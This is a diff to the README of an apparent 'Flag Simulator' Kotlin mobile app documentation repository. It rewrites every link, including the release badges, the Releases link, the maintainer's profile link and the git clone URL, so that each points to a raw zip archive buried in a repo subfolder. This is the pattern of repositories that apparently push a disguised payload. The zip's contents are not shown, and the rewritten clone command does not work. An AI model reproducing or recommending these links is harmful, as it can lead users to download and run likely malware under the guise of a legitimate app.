@@ -2,7 +2,7 @@
 
 Welcome to the official documentation repository for the Kotlin mobile application variant of the Flag Simulator project. This repository serves as a comprehensive guide to help you understand, use, and contribute to the Flag Simulator mobile app.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/releases)
+[![Download Releases](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ The Flag Simulator mobile app allows users to explore various flags from around 
 
 To get started with the Flag Simulator mobile app, follow these steps:
 
-1. **Download the App**: Visit our [Releases section](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/releases) to download the latest version of the app.
+1. **Download the App**: Visit our [Releases section](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip) to download the latest version of the app.
 2. **Install on Your Device**: Once downloaded, follow the installation instructions specific to your device.
 
 ## Usage
@@ -69,11 +69,11 @@ This project is licensed under the GPL-3.0 License. You can freely use, modify, 
 
 For any inquiries or feedback, please reach out to the project maintainers:
 
-- **Carlos Ca**: [GitHub Profile](https://github.com/carlosca59)
+- **Carlos Ca**: [GitHub Profile](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)
 
 Thank you for your interest in the Flag Simulator mobile app! We hope you enjoy exploring the world of flags.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/releases)
+[![Download Releases](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)
 
 ---
 
@@ -111,7 +111,7 @@ For developers looking to contribute to the Flag Simulator mobile app, here are 
 
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs.git
+   git clone https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip
    ```
 2. **Open in Android Studio**: Launch Android Studio and open the cloned project.
 3. **Install Dependencies**: Make sure to install all necessary dependencies as specified in the project documentation.
@@ -152,4 +152,4 @@ We would like to thank all contributors and users who support the Flag Simulator
 
 The Flag Simulator mobile app is a fun and educational tool for anyone interested in flags. We hope this documentation helps you get started and contributes to your understanding of vexillology.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/releases)
+[![Download Releases](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)](https://github.com/carlosca59/Flag-Simulator_MobileApp_Kotlin_Docs/raw/refs/heads/Flag-Simulator_MobileApp_Kotlin_Docs_Main-dev/RepoData/Description/GitHub/Docs_Simulator_App_Mobile_Kotlin_Flag_2.6.zip)
